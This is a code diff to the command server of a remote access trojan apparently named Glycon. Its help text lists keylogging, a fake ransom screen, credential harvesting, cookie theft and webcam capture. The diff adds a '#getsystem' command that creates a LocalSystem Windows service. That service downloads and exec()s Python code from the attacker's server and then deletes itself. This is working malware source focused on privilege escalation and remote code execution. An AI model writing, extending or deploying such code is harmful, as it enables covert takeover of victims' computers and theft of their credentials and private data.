@@ -1,3 +1,4 @@
+from flask import request
 from flask_login import current_user
 from flask_socketio import SocketIO, join_room, leave_room, emit
 from glycon.config import CONFIG
@@ -220,6 +221,9 @@ def init_socket_handlers(socketio):
             if not agent_id or not command:
                 return
 
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+
             # Handle # shortcuts
             if command.startswith('#'):
                 parts = command[1:].split(' ', 1)
@@ -240,17 +244,17 @@ def init_socket_handlers(socketio):
                         "  #nokeylogger       - Stop keylogger\r\n"
                         "  #fakeransom        - Deploys full-screen ransom note and kills explorer.exe\r\n"
                         "  #clearransom       - Closes ransom note and restarts explorer.exe\r\n"
+                        "  #getsystem         - Elevate to NT AUTHORITY\\SYSTEM (Requires Admin)\r\n"
                     )
                     emit('terminal_output', {
                         'agent_id': agent_id,
                         'output': help_text,
                         'current_dir': current_dir
                     }, room=f"terminal_{agent_id}")
+                    conn.close()
                     return
 
                 # Task Creation Logic
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
                 task_type = None
                 task_data = {}
 
@@ -371,6 +375,56 @@ result = "Ransomware screen cleared and Explorer restarted"
                     task_type = 'webcam'
                 elif cmd_type == 'creds':
                     task_type = 'harvest_creds'
+                elif cmd_type == 'getsystem':
+                    # Get the most recent server_url from agent configurations
+                    c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
+                    row = c.fetchone()
+                    server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
+                    
+                    # Log the URL we found
+                    print(f"[#getsystem] Using server_url: {server_url}")
+                    
+                    # Define the code that will run as SYSTEM
+                    python_code = f"import requests;url='{server_url}/a/d';exec(requests.get(url, verify=False).text)"
+                    
+                    task_type = 'execute_python'
+                    # We use repr(python_code) to ensure proper escaping of the inner code string
+                    python_payload = f"""
+import os, ctypes, subprocess, time, sys
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except: return False
+
+if not is_admin():
+    result = 'Error: Administrative privileges required for #getsystem'
+else:
+    service_name = 'GlyconElevator'
+    p_code = {repr(python_code)}
+    # Build the command string carefully
+    python_cmd = sys.executable + ' -c "' + p_code + '"'
+    
+    # Construct sc command. binPath needs to be one single argument for the list-based subprocess.run
+    bin_path_val = 'cmd /c ' + '"' + python_cmd + '"'
+    create_svc = ['sc', 'create', service_name, 'binPath=', bin_path_val, 'start=', 'demand', 'obj=', 'LocalSystem']
+    start_svc = ['sc', 'start', service_name]
+    delete_svc = ['sc', 'delete', service_name]
+    
+    try:
+        # 1. Create service
+        cp = subprocess.run(create_svc, capture_output=True, text=True)
+        if cp.returncode != 0:
+            result = f"Error creating service: {{cp.stderr}}"
+        else:
+            # 2. Start service
+            subprocess.run(start_svc, capture_output=True)
+            time.sleep(2)
+            # 3. Cleanup
+            subprocess.run(delete_svc, capture_output=True)
+            result = 'Success: NT AUTHORITY/SYSTEM agent spawn command sent.'
+    except Exception as e:
+        result = f'Error during elevation: {{str(e)}}'
+"""
+                    task_data = {'code': python_payload.strip()}
                 elif cmd_type == 'cookies':
                     task_type = 'steal_cookies'
                 elif cmd_type == 'keylogger':
